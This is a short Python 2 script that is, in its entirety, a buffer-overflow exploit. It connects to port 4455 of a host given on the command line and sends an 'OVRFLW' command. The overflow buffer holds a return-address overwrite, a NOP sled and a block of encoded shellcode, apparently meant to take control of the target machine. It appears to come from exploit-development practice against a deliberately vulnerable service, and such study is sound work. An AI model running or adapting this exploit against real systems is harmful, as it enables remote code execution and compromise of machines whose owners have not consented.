#!/usr/bin/python

import sys, socket

if len(sys.argv) <2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
junk = "\x41" * 3000
end = "\r\n"

shellcode = (
"\xda\xcf\xd9\x74\x24\xf4\xb8\x40\xab\xbb\x6d\x5b\x33\xc9\xb1"
"\x52\x31\x43\x17\x83\xeb\xfc\x03\x03\xb8\x59\x98\x7f\x56\x1f"
"\x63\x7f\xa7\x40\xed\x9a\x96\x40\x89\xef\x89\x70\xd9\xbd\x25"
"\xfa\x8f\x55\xbd\x8e\x07\x5a\x76\x24\x7e\x55\x87\x15\x42\xf4"
"\x0b\x64\x97\xd6\x32\xa7\xea\x17\x72\xda\x07\x45\x2b\x90\xba"
"\x79\x58\xec\x06\xf2\x12\xe0\x0e\xe7\xe3\x03\x3e\xb6\x78\x5a"
"\xe0\x39\xac\xd6\xa9\x21\xb1\xd3\x60\xda\x01\xaf\x72\x0a\x58"
"\x50\xd8\x73\x54\xa3\x20\xb4\x53\x5c\x57\xcc\xa7\xe1\x60\x0b"
"\xd5\x3d\xe4\x8f\x7d\xb5\x5e\x6b\x7f\x1a\x38\xf8\x73\xd7\x4e"
"\xa6\x97\xe6\x83\xdd\xac\x63\x22\x31\x25\x37\x01\x95\x6d\xe3"
"\x28\x8c\xcb\x42\x54\xce\xb3\x3b\xf0\x85\x5e\x2f\x89\xc4\x36"
"\x9c\xa0\xf6\xc6\x8a\xb3\x85\xf4\x15\x68\x01\xb5\xde\xb6\xd6"
"\xba\xf4\x0f\x48\x45\xf7\x6f\x41\x82\xa3\x3f\xf9\x23\xcc\xab"
"\xf9\xcc\x19\x7b\xa9\x62\xf2\x3c\x19\xc3\xa2\xd4\x73\xcc\x9d"
"\xc5\x7c\x06\xb6\x6c\x87\xc1\x79\xd8\xa3\x0e\x12\x1b\xab\x21"
"\xbe\x92\x4d\x2b\x2e\xf3\xc6\xc4\xd7\x5e\x9c\x75\x17\x75\xd9"
"\xb6\x93\x7a\x1e\x78\x54\xf6\x0c\xed\x94\x4d\x6e\xb8\xab\x7b"
"\x06\x26\x39\xe0\xd6\x21\x22\xbf\x81\x66\x94\xb6\x47\x9b\x8f"
"\x60\x75\x66\x49\x4a\x3d\xbd\xaa\x55\xbc\x30\x96\x71\xae\x8c"
"\x17\x3e\x9a\x40\x4e\xe8\x74\x27\x38\x5a\x2e\xf1\x97\x34\xa6"
"\x84\xdb\x86\xb0\x88\x31\x71\x5c\x38\xec\xc4\x63\xf5\x78\xc1"
"\x1c\xeb\x18\x2e\xf7\xaf\x29\x65\x55\x99\xa1\x20\x0c\x9b\xaf"
"\xd2\xfb\xd8\xc9\x50\x09\xa1\x2d\x48\x78\xa4\x6a\xce\x91\xd4"
"\xe3\xbb\x95\x4b\x03\xee"
)




buffer = cmd + "A" * 1601 + "\x83\x66\x66\x56" + "\x90" * 40 + shellcode + "C" * (3000-1601-4-351-40) + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
